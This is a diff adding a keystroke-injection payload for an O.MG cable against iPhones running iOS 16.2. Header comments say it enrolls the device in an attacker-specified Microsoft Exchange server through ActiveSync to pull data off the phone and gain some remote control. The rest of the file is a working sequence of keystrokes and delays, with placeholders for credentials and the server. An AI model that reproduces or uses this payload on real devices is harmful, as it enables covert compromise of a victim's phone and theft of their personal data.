@@ -1,0 +1,67 @@
+REM Version 1.0
+REM OS: iOS
+REM Author: Peaakss
+REM Description: This payload uses iOS active sync to add a microsoft exchange server, this allows you to exfil data from the iPhone as well as have certain permissoins giving you remote acccess with some features of the device
+REM NOITCE Payload was made on iOS 16.2 - iPhone | Timing may have have to be changed based on version/model
+REM NOTICE Lighting to USB-A or USB-C camera adapter is needed to run this payload, ative end of the O.MG cable must be plugged into the end of the adapter
+REM NOTICE This payload needs Full Keyboard Access to enabled on the device
+REM NOTICE Due to this payloads ability, this payload requires the finally step to add the exchange server to be completed by the user. 
+
+
+GUI h
+DELAY 150
+GUI h
+DELAY 150
+GUI SPACE
+DELAY 150
+STRING ActiveSync
+DELAY 250
+ENTER
+DELAY 300
+TAB
+DELAY 150
+DOWNARROW 
+DELAY 300
+SPACE
+DELAY 300
+DOWNARROW
+DELAY 300
+SPACE
+DELAY 150
+SPACE
+DELAY 150
+STRING "EMAIL"
+DELAY 150
+ENTER
+DELAY 150
+ENTER
+DELAY 150
+SPACE
+DELAY 150
+SPACE
+DELAY 150
+STRING "PASSWORD"
+DELAY 150
+ENTER
+DELAY 150
+ENTER
+DELAY 150
+TAB
+DELAY 150
+DOWNARROW
+DELAY 150
+SPACE
+DELAY 150
+STRING "SERVER"
+DELAY 150
+ENTER
+DELAY 150
+STRING "Domain"
+DELAY 150
+ENTER
+DELAY 150
+STRING "USERNAME"
+DELAY 150
+ENTER
+DELAY 100
+ENTER
